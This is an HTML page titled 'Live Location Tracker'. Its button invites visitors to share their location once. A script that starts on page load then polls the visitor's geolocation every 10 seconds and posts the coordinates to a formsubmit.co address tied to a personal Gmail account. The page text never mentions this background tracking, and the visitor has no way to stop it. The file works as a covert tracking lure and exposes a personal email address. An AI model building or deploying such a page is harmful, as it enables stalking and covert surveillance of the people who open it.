
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Live Location Tracker</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #1e3c72, #2a5298);
      color: white;
      text-align: center;
      padding-top: 100px;
    }
    h1 {
      font-size: 48px;
      margin-bottom: 20px;
      text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
    }
    p {
      font-size: 20px;
    }
    .logo {
      width: 120px;
      margin-bottom: 30px;
      animation: float 3s ease-in-out infinite;
    }
    @keyframes float {
      0%, 100% {
        transform: translateY(0);
      }
      50% {
        transform: translateY(-10px);
      }
    }
    .location-button {
      font-size: 24px;
      padding: 20px 50px;
      border: none;
      border-radius: 15px;
      background-color: #00c6ff;
      color: white;
      cursor: pointer;
      box-shadow: 0 10px 20px rgba(0,0,0,0.3);
      transition: all 0.3s ease;
      animation: pulse 2s infinite;
    }
    .location-button:hover {
      background-color: #007acc;
      transform: scale(1.05);
    }
    .location-button:active {
      animation: clickFlash 0.4s ease;
    }
    @keyframes clickFlash {
      0% { background-color: #007acc; }
      50% { background-color: #ffffff; color: #007acc; }
      100% { background-color: #007acc; }
    }
    @keyframes pulse {
      0% { box-shadow: 0 0 0 0 rgba(0, 198, 255, 0.6); }
      70% { box-shadow: 0 0 0 20px rgba(0, 198, 255, 0); }
      100% { box-shadow: 0 0 0 0 rgba(0, 198, 255, 0); }
    }
  </style>
</head>
<body>

  <img src="https://img.icons8.com/fluency/96/marker.png" class="logo" alt="Location Logo">
  <h1>Welcome to My Live Location Tracker</h1>
  <p>Click the button below to start sharing your real-time location with us.</p>

  <button class="location-button" onclick="getLocation()">üìç Share My Location</button>

  <script>
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          function(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            alert("‚úÖ Location Sent!\nLatitude: " + lat + "\nLongitude: " + lon);

            fetch("https://formsubmit.co/atuldhanotiya7@gmail.com", {
              method: "POST",
              headers: {
                "Content-Type": "application/json"
              },
              body: JSON.stringify({
                Latitude: lat,
                Longitude: lon
              })
            });
          },
          function(error) {
            alert("‚ùå Location access denied or unavailable.");
          }
        );
      } else {
        alert("‚ùå Geolocation is not supported by this browser.");
      }
    }

    // Live tracking every 10 seconds
    setInterval(() => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          fetch("https://formsubmit.co/atuldhanotiya7@gmail.com", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              Live_Tracking: "ON",
              Latitude: lat,
              Longitude: lon
            })
          });
        });
      }
    }, 10000);
  </script>
</body>
</html>
